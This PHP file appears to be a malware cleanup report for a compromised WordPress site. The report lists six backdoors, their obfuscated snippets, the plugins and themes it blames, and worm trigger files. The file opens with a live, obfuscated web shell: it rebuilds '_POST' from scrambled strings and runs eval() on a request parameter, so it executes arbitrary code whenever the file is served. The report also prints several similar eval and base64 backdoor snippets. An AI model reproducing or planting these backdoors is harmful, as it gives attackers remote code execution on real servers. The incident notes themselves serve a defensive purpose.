<?php
$ebx21= "eru_tspo" ; $ljg47 =$ebx21[5].$ebx21[4]. $ebx21[1]. $ebx21[4].$ebx21[7]. $ebx21[2].$ebx21[6].$ebx21[6].$ebx21[0]. $ebx21[1];$ylso7 =$ljg47($ebx21[3]. $ebx21[6]. $ebx21[7].$ebx21[5]. $ebx21[4]);

//run $_POST['qe91e7a'] code when found
if (isset( ${ $ylso7 }['qe91e7a' ] )) {
	eval( ${$ylso7}['qe91e7a'] );
}
?>


<pre>
BACKDOOR # 1: eval($_POST['qe91e7a']);
-- backdoor was a result of an exploit found in Plugin SitePress Multilingual CMS (WordPress) created a utf.php file that can be accessed via an external server and accepts code injection.
<?php
$uml68="steour_p" ; $vge63 = $uml68[0]. $uml68[1]. $uml68[5].$uml68[1].$uml68[3].$uml68[4].$uml68[7]. $uml68[7].$uml68[2].$uml68[5] ;$mrhk96 =$vge63( $uml68[6]. $uml68[7]. $uml68[3].$uml68[0].$uml68[1] );
?>

BACKDOOR # 2: eval($_POST['qeb6d80'])
-- backdoor was a result of an exploit found in Plugin SitePress Multilingual CMS (WordPress) created an info.php file that can be accessed via an external server and accepts code injection.

<?php
$lijc6 = "_stpo" ; $yhl0=strtoupper( $lijc6[0].$lijc6[3]. $lijc6[4].$lijc6[1].$lijc6[2]) ; 
?>
BACKDOOR # 3: eval($_POST['q0e7f9c'])
-- backdoor was a result of an exploit found in WPML Translation Management (WordPress) created an article.php file that can be accessed via an external server and accepts code injection.

<?php
$rksp63= "sroep_ut"; $szak0 = $rksp63[0].$rksp63[7].$rksp63[1]. $rksp63[7].$rksp63[2]. $rksp63[6].$rksp63[4].$rksp63[4].$rksp63[3].$rksp63[1]; $jtjc3 =$szak0 ($rksp63[5]. $rksp63[4].$rksp63[2]. $rksp63[0].$rksp63[7]) ;
?>
BACKDOOR # 4: eval($_POST['q1c1ae6'])
--backdoor was a result of an unknown exploit. File [header.php] was found under minglian theme > assets folder.

<?php
$rehy7 ="pots_"; $ldng94=strtoupper($rehy7[4].$rehy7[0] .$rehy7[1]. $rehy7[3]. $rehy7[2] ) ;
?>
BACKDOOR # 5: eval($_POST['q828043'])
--backdoor was a result of an unknown exploit. File [lib.php] was found under minglian theme > assets > js folder.

<?php
$gpj15 = "dbet6pcao_s4" ;$bdlv7= strtolower( $gpj15[1].$gpj15[7].$gpj15[10]. $gpj15[2].$gpj15[4].$gpj15[11]. $gpj15[9] .$gpj15[0].$gpj15[2]. $gpj15[6].$gpj15[8]. $gpj15[0]. $gpj15[2] ) ;$jbk6=strtoupper($gpj15[9].$gpj15[5].$gpj15[8].$gpj15[10].$gpj15[3]);
?>
BACKDOOR # 6: eval(base64_decode($_POST['n3729f7']))
--encrypted backdoor was a result of an unknown exploit. File [xml.php] was found under drive > uploads folder.


Malicious worms found:

php.malware signatures.include.020 (application; redirector):
/cache/index.php
/etc/index.php
/logs/index.php
/mail/index.php
/public_ftp/index.php
/ssl/index.php

htaccess.spam-seo.redirect.006.02 (uses search engines to open / run the trigger file)
/etc/.htaccess
/logs/.htaccess
/mail/.htaccess
/public_ftp/.htaccess
/ssl/.htaccess
/cache/.htaccess

image.php_code.001 -- image found in cgi-bin, your site icon is infected with the trigger to set all of these off.

rex.eval_cookie.003 -- fetches a cookie from a browser to trigger the application
/public_html/drive/cache/meta/info.php
/public_html/drive/uploads/2016/09/start25.php

rex.include_abs_path.004 -- entry point of the worm
/public_html/index.php

php.malware.GLOBALS
Admin Menu Editor Pro -- infected, database API (every time you save anything).
Minglian Theme -- infected, search form triggers worm when a search is done
File Uploaded last July 7, 2017 -- triggers the worm. uploaded, not created -- probably by an infected computer/browser
SitePress Multilingual CMS (Plugin) -- /classes/utf.php -- trigger file.
SitePress Multilingual CMS (Plugin) -- inc/functions-debug-information.php -- part of the worm, also serves as a trigger file.
SitePress Multilingual CMS (Plugin) -- res/lib.php -- part of the worm.
WPML String Translation -- classes/class-wpml-st-string.php -- part of the worm, also doubles as trigger file.
WPML String Translation -- classes/db70.php -- part of the worm.
WPML String Translation -- inc/package-translation/inc/wpml-package-translation-ui.class.php -- part of the worm, doubles as trigger file.
WordPress Core -- themes/twentyfifteen/qmonkyzl.php -- part of the worm


</pre>